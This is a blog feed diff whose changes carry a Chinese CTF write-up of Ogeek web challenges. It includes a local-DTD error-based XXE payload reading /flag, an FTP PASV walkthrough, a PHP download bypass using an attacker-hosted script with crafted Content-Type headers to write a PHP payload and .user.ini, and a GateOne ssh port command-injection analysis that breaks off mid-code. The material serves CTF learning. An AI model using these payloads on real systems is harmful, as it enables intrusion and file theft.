@@ -5,9 +5,9 @@
   
   <link href="/atom.xml" rel="self"/>
   
-  <link href="http://yoursite.com/"/>
+  <link href="https://cyc1e183.github.io/"/>
   <updated>2020-04-05T02:27:08.238Z</updated>
-  <id>http://yoursite.com/</id>
+  <id>https://cyc1e183.github.io/</id>
   
   <author>
     <name>Cyc1e</name>
@@ -18,8 +18,8 @@
   
   <entry>
     <title>关于file_put_contents的一些小测试</title>
-    <link href="http://yoursite.com/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/"/>
-    <id>http://yoursite.com/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</id>
+    <link href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/"/>
+    <id>https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</id>
     <published>2020-04-03T06:16:42.000Z</published>
     <updated>2020-04-05T02:27:08.238Z</updated>
     
@@ -33,19 +33,19 @@
     </summary>
     
     
-      <category term="Cyc1e的漏洞分析之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的漏洞分析之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="file_put_contents" scheme="http://yoursite.com/tags/file-put-contents/"/>
+      <category term="file_put_contents" scheme="https://cyc1e183.github.io/tags/file-put-contents/"/>
     
-      <category term="php://filter" scheme="http://yoursite.com/tags/php-filter/"/>
+      <category term="php://filter" scheme="https://cyc1e183.github.io/tags/php-filter/"/>
     
   </entry>
   
   <entry>
     <title>GXZYCTF部分Web Writeup</title>
-    <link href="http://yoursite.com/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/"/>
-    <id>http://yoursite.com/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/</id>
+    <link href="https://cyc1e183.github.io/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/"/>
+    <id>https://cyc1e183.github.io/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/</id>
     <published>2020-03-09T01:52:20.000Z</published>
     <updated>2020-04-03T09:04:40.378Z</updated>
     
@@ -59,17 +59,17 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
   </entry>
   
   <entry>
     <title>小白的跨方向IoT DIR850L-A1固件漏洞分析</title>
-    <link href="http://yoursite.com/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
+    <link href="https://cyc1e183.github.io/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>https://cyc1e183.github.io/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
     <published>2020-03-04T11:59:46.000Z</published>
     <updated>2020-03-04T12:01:35.132Z</updated>
     
@@ -82,19 +82,19 @@
     </summary>
     
     
-      <category term="Cyc1e的漏洞分析之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的漏洞分析之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="https://cyc1e183.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="IoT" scheme="http://yoursite.com/tags/IoT/"/>
+      <category term="IoT" scheme="https://cyc1e183.github.io/tags/IoT/"/>
     
   </entry>
   
   <entry>
     <title>OGeek决赛两道Web总结分析</title>
-    <link href="http://yoursite.com/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/</id>
+    <link href="https://cyc1e183.github.io/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/"/>
+    <id>https://cyc1e183.github.io/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/</id>
     <published>2019-09-26T04:03:28.000Z</published>
     <updated>2020-03-05T10:59:24.949Z</updated>
     
@@ -108,23 +108,23 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="AWD" scheme="http://yoursite.com/tags/AWD/"/>
+      <category term="AWD" scheme="https://cyc1e183.github.io/tags/AWD/"/>
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="https://cyc1e183.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
   <entry>
     <title>Ogeek 线上Web Writeup</title>
-    <link href="http://yoursite.com/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/"/>
-    <id>http://yoursite.com/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/</id>
+    <link href="https://cyc1e183.github.io/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/"/>
+    <id>https://cyc1e183.github.io/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/</id>
     <published>2019-08-27T11:37:30.000Z</published>
-    <updated>2020-03-05T10:59:24.941Z</updated>
+    <updated>2020-04-05T07:08:41.081Z</updated>
     
     <content type="html"><![CDATA[<p><strong>Ogeek和XNUCA有一天重了，第一天被卡在XNUCA，EZphp转这（<a href="https://www.jianshu.com/p/1875219503fd）上，心态有点受不了，所以Ogeek没什么战斗力" target="_blank" rel="noopener">https://www.jianshu.com/p/1875219503fd）上，心态有点受不了，所以Ogeek没什么战斗力</a>……</strong></p><h3 id="0x01-LookAround"><a href="#0x01-LookAround" class="headerlink" title="0x01 LookAround"></a>0x01 LookAround</h3><p>右键查看网页源码可以看到加载了一个/js/_.js，查看内容阔以看到向callback发送了个请求</p><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-81074843651728ce.png" alt></p><p>请求方式是发送xml数据，所以判断为是一个XEE漏洞，不过利用参见的XXE payload打不通，只能够判断系统文件是否存在，</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:////flag"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%a;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-574c6fce1ea6c651.png" alt></p><p>文件存在返回200状态，如果文件不存在则返回500状态，通过这点也可以确定存在XXE漏洞，只是如何触发的问题了，题目提示builded from tomcat:8-jre8<br>参考：<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-bd66835346322c7a.png" alt></p><p>不懂的话跟一下文章下面的视频就可以知道 tomcat:8-jre8 中的fonts.dtd可用，所以直接copy文章中对应的payload就好了</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/xml/fontconfig/fonts.dtd"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">expr</span> <span class="meta-string">'aaa)&gt;</span></span></span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ENTITY &amp;#x25; <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ENTITY &amp;#x25; <span class="meta-keyword">eval</span> <span class="meta-string">"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="symbol">&amp;#x25;</span>eval;</span></span><br><span class="line"><span class="xml">        <span class="symbol">&amp;#x25;</span>error;</span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ELEMENT <span class="meta-keyword">aa</span> (<span class="meta-keyword">bb</span>'&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="perl">    %local_dtd;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-73974d8169b53562.png" alt></p><h2 id="0x02-Easy-Realworld-Challenge"><a href="#0x02-Easy-Realworld-Challenge" class="headerlink" title="#0x02 Easy Realworld Challenge"></a>#0x02 Easy Realworld Challenge</h2><p>主办方放题失误吧，晚上放题，后来做了修改，白天又恢复了回去，所以变成了大家看到的两到题，因为题目上有一个log viewer，可以查看之前选手的操作记录（还是视频的），所以就是成了抄作业解题，跟着telnet://172.18.0.3 用户ctf，密码ctf,之后利用PSAV方式于服务器建立连接接收数据。</p><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-28ead04fef913b8e.png" alt></p><p>然后新建一个终端到生成的端口号上接收数据就好了</p><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-348adfa485e48aea.png" alt></p><p>唯一的可能会不知道的就是怎么知道被动连接的端口号，PSAV生成的例如：(172,18,0,3,131,116)，那么生成的端口号就是：131*256+116 = 33652(那个计算器算就好了)</p><h3 id="0x03-Enjoy-your-self"><a href="#0x03-Enjoy-your-self" class="headerlink" title="0x03 Enjoy your self"></a>0x03 Enjoy your self</h3><p>题目第一层源码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"../../utils/utils.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'filename'</span>])  <span class="keyword">and</span> preg_match(<span class="string">"/^\w&#123;8&#125;$/"</span>, $_REQUEST[<span class="string">'filename'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $filename = strtolower($_REQUEST[<span class="string">'filename'</span>]);</span></span><br><span class="line"><span class="php">    touch(<span class="string">"backup/&#123;$filename&#125;.txt"</span>);</span></span><br><span class="line"><span class="php">    unlink(glob(<span class="string">"backup/*"</span>)[<span class="number">0</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">"/^\w&#123;8&#125;$/"</span>, $_REQUEST[<span class="string">'filename'</span>])</span></span></span><br></pre></td></tr></table></figure><p>正则匹配的是字母数字和下划线，固定长度为8，排序后会删除第一个文件，所以我们写入的文件排序在后面的话是不会被删除的，所以猜测，列表中存在存在某个不会被删除的文件，而这个目录又叫backup，所以猜测，可能会有隐藏的源码备份文件，而如果我们写入的文件排在固定文件之前，我们的文件会被删除。所以利用这个特性来fuzz固定文件的文件名，最后得到文件名为 aefebab8.txt，其中内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- src/8a66c58a168c9dc0fb622365cbe340fc.php --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"../utils/utils.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$sandbox = Get_Sandbox();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'method'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $method = $_REQUEST[<span class="string">'method'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($method == <span class="string">'info'</span>)&#123;</span></span><br><span class="line"><span class="php">        phpinfo();</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">elseif</span>($method == <span class="string">'download'</span> <span class="keyword">and</span> <span class="keyword">isset</span>($_REQUEST[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $url = $_REQUEST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">        $url_parse = parse_url($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($url_parse[<span class="string">'scheme'</span>]) <span class="keyword">or</span> $url_parse[<span class="string">'scheme'</span>] != <span class="string">'http'</span> <span class="keyword">or</span> !<span class="keyword">isset</span>($url_parse[<span class="string">'host'</span>]) <span class="keyword">or</span> $url_parse[<span class="string">'host'</span>] == <span class="string">""</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $path_info = pathinfo($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(strpos($path_info[<span class="string">'filename'</span>], <span class="string">"."</span>) !== <span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!Check_Ext($path_info[<span class="string">'extension'</span>]))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $response = GetFileInfoFromHeader($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $save_dir = <span class="string">"../users/$&#123;sandbox&#125;/uploads/&#123;$response['type']&#125;/"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(is_dir(dirname($save_dir)) <span class="keyword">and</span> !is_dir($save_dir))&#123;</span></span><br><span class="line"><span class="php">            mkdir($save_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $save_path = <span class="string">"&#123;$save_dir&#125;&#123;$path_info['filename']&#125;.&#123;$response['ext']&#125;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"/uploads/&#123;$response['type']&#125;/&#123;$path_info['filename']&#125;.&#123;$response['ext']&#125;"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!is_dir($save_path))&#123;</span></span><br><span class="line"><span class="php">            file_put_contents($save_path, $response[<span class="string">'content'</span>]);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>给了源文件地址和源码，接下来就是代码审计的事，通过源文件查看phpinfo，可以得到网站根路径，以及知道有disable_function我就不多说了，代码提供一个远程文件下载功能，不过由于Check_Ext 函数限制了可下载的文件类型，只可以任意下载其他网站上的jpg、png 等图片格式的文件到本地，并以{$response[‘type’]}为目录名{$path_info[‘filename’]}.{$response[‘ext’]}为文件名，测试发现$response的值是从远程服务器response header中的Content-Type 获取，所以控制了个人服务器某个文件的Content-Type，构造</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">method</span>=<span class="title">download</span>&amp;<span class="title">url</span>=<span class="title">http</span>:</span><span class="comment">//x.x.x.x/.jpg</span></span><br></pre></td></tr></table></figure><p>去访问个人服务器上的一个图片文件就可以控制下载的内容，但是只下载图片肯定是解不了题，所以我们可以在vps上建一个.htaccess,设置404跳转</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument <span class="number">404</span> /cccc.php    #设置<span class="number">404</span> 跳转到到cccc.php 页面</span><br></pre></td></tr></table></figure><p>所以但访问某个不存在的jpg文件时就会跳转到cccc.php上，这样可以过掉Check_Ext的后缀检测。所以就是如何构造cccc.php的事了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cccc.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: aaa/./1.jpg'</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;?php file_get_contents('/flag');?&gt;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#我已经知道flag在这了就不多写scandir('/');这一步了</span></span><br></pre></td></tr></table></figure><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-4cc317440cd80495.png" alt></p><p>这样会跨目录在uploads目录上创建1.jpg,文件的内容就是我们写入的代码</p><p><img src="https://upload-images.jianshu.io/upload_images/8418106-a3beece842f0d789.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>写入jpg文件格式的代码后，也就需要php文件包涵执行，题目限制死了，反正我是没写php文件成功过（听师傅们说前一晚放题时是可以的，我试过 /aaa/php/.没写成功就放弃了），.htaccess文件也写不了，不过还阔以写.user.ini文件，不过.user.ini文件只对当前目录和子目录中的php文件生效，所以我们写的时候还得跨到users目录去（sandbox可以试试，我是没写进去），这个地方有个坑，题目设置了定时清，还清得挺快的，刚开始一直以为不可写，后来突然发现有一次写进去了然后没了，才发现原来有定时清，所以利用bp 循环写下就好，次数不要太大，会被ban。<br>构造cccc.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">'Content-Type: .././.user.ini'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(<span class="string">"auto_prepend_file = /var/www/html/users/[sandbox]/uploads/1.jpg"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8418106-8aa95fcc12ef8f4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h3 id="0x04-Easy-Realworld-Challenge-2"><a href="#0x04-Easy-Realworld-Challenge-2" class="headerlink" title="0x04 Easy Realworld Challenge 2"></a>0x04 Easy Realworld Challenge 2</h3><p>比赛期间没看这题（自我认识明确）按着glzjin师傅（<a href="https://www.zhaoj.in/）的思路进行的赛后复现，题目是一个开源的一个HTML5" target="_blank" rel="noopener">https://www.zhaoj.in/）的思路进行的赛后复现，题目是一个开源的一个HTML5</a> web-based terminal emulator and SSH client，地址：<a href="https://github.com/liftoff/GateOne，题目提示了flag" target="_blank" rel="noopener">https://github.com/liftoff/GateOne，题目提示了flag</a> is in localhost, show me your shell! ，也就是需要getshell了。解法不唯一，有好几个RCE点。漏洞代码路径：/gateone/applications/terminalplugins/ssh/ssh.py</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ssh.py</span></span><br><span class="line">def get_host_fingerprint(self, settings):</span><br><span class="line">    <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    Returns a the hash of the given host's public key by making a remote</span></span><br><span class="line"><span class="string">    connection to the server (not just by looking at known_hosts).</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    out_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'port'</span> <span class="keyword">not</span> <span class="keyword">in</span> settings:</span><br><span class="line">       <span class="built_in"> port </span>= 22</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in"> port </span>= settings[<span class="string">'port'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'host'</span> <span class="keyword">not</span> <span class="keyword">in</span> settings:</span><br><span class="line">        out_dict[<span class="string">'result'</span>] = _(<span class="string">"Error:  You must supply a 'host'."</span>)</span><br><span class="line">        message = &#123;<span class="string">'terminal:sshjs_display_fingerprint'</span>: out_dict&#125;</span><br><span class="line">        self.write_message(message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host = settings[<span class="string">'host'</span>]</span><br><span class="line">    self.ssh_log.<span class="builtin-name">debug</span>(</span><br><span class="line">        <span class="string">"get_host_fingerprint(%s:%s)"</span> % (host, port),</span><br><span class="line">        metadata=&#123;<span class="string">'host'</span>: host, <span class="string">'port'</span>: port&#125;)</span><br><span class="line">    out_dict.update(&#123;</span><br><span class="line">        <span class="string">'result'</span>: <span class="string">'Success'</span>,</span><br><span class="line">        <span class="string">'host'</span>: host,</span><br><span class="line">        <span class="string">'fingerprint'</span>: None</span><br><span class="line">    &#125;)</span><br><span class="line">    ssh = which(<span class="string">'ssh'</span>)</span><br><span class="line">    command = <span class="string">"%s -p %s -oUserKnownHostsFile=none -F. %s"</span> % (ssh, port, host)</span><br><span class="line">    m = self.new_multiplex(</span><br><span class="line">        command,</span><br><span class="line">        <span class="string">'get_host_key'</span>,</span><br><span class="line">        <span class="attribute">logging</span>=<span class="literal">False</span>) #<span class="built_in"> Logging </span>is <span class="literal">false</span> so we don<span class="string">'t make tons of silly logs</span></span><br></pre></td></tr></table></figure><p>其中port没有经过任何安全检测或过滤就直接拼接到了command上，用于终端执行ssh连接命令，而get_host_fingerprint函数是在WebSocket中触发执行</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#ssh.py</span><br><span class="line">hooks = &#123;</span><br><span class="line">    #<span class="symbol">'Web'</span>: [(r<span class="string">"/ssh"</span>, <span class="type">KnownHostsHandler</span>)],</span><br><span class="line">    <span class="symbol">'WebSocket'</span>: &#123;</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_known_hosts': get_known_hosts,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_save_known_hosts': save_known_hosts,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_connect_string': get_connect_string,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_execute_command': ws_exec_command,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_identities': get_identities,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_public_key': get_public_key,</span><br><span class="line">        <span 